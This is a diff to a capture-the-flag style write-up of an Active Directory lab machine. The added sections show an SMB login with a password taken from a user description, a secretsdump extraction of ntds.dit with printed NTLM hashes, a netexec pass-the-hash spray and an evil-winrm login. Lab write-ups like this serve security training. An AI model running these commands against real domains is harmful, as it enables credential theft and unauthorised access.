@@ -5,22 +5,22 @@
 - Difficulty: Intermediate
 - Community Rating: Very Hard
 - Platform: Active Directory
-- Skills Demonstrated: SMB Enumeration, Active Directory, BloodHound, Impacket Tools, Resource-Based Delegation Constraint, Windows Privilege Escalation
+- Skills Demonstrated: SMB Enumeration, Active Directory, Credential Discovery, Pass-the-Hash, BloodHound, Impacket Tools, Resource-Based Constrained Delegation (RBCD), Windows Privilege Escalation
 
 ## Methodology
 
-This lab assessment followed the following methodoloy:
+This lab assessment followed the methodoloy below:
 
 - Enumeration
 - Credential Discovery
 - Exploitation
-- Privilege Escalaltion
+- Privilege Escalation
 - Post-Exploitation
 
 ---
 ## Enumeration 
 
-As per standard intial enumeration, I began with a `nmap` port scan to identify accessible ports and services
+As with any engagement, I began with a `nmap` port scan to identify accessible ports and services
 ```
 nmap 192.168.226.175 -sCV -A -p-
 ```
@@ -66,11 +66,11 @@ Key Findings:
 - port 3389 (RDP)
 - port 5985 (WinRM)
 
-After a successfull port scan identifying the open ports, further enumeration was peformed using `Enum4linx` to query the SMB service for potential shares and user.
+After a successfull port scan identifying the open ports, further enumeration was peformed using `Enum4linx` to query the SMB service for potential shares and users.
 ```
 enum4linux 192.168.226.175
 ```
-This resulted in a comprehensive list of users along with their respective roles. For the user `V.Ventz` we discover what appears to be a potentiall password in the description field.
+This revealed several domain users along with their respective roles. For the user `V.Ventz`, the description field appeared to contain a plaintext password.
 ```
 index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                                                                                                
 index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
@@ -86,4 +86,55 @@ index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    
 index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
 index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
 ```
+Using these credentials, I was able to successfully authenticate to the SMB service using `smbclient` to discover any sensitive information.
+
+![smbclient](Images/smbclient.png)
+
+After verify the credentials found were valid and authentication was obtained, we find a non default share `Password Audit`. Further investigation into the share reveals two directories: `Active Directory` and `registry`, which contained the `SECURITY`, `SYSTEM`, and `ntds.dit` files. 
+
+![password_audit](Images/password_audit.png)
+
+![ntds](Images/ntds.png)
+
+## Credential Discovery
+
+By utilizing the Impacket tool `secretsdump`, we can extract the local hashes for the target host as we now have a copy of the Active Directory database (`ntds.dit`).
+```
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+```
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL 
+[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
+M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
+K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
+L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
+...
+```
+
+The dump succesfully recovered NTLM hashes for multiple domain users, which can be utilized fo techniques such as hash cracking and pass-the-hash.
+
+## Initial Access
+
+Next I deteremine whether the hashes can be used for authentication directly or would require to be cracked. The hashes were saved locally and the sprayed against the previously found users using **Netexec** to identify accounts with remote access privilege.
+```
+netexec winrm 192.168.226.175 -u users.txt -H hashes.txt
+```
+
+![netexec](Images/netexec.png)
+
+The scan confirmed that the account L.Livingstone could successfully authenticate to the WinRM service using pass-the-hash authentication.
+
+An interactive PowerShell session was then established using `evil-winrm`.
+```
+evil-winrm -i 192.168.226.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
+```
+
+![winrm](Images/winrm.png)
 
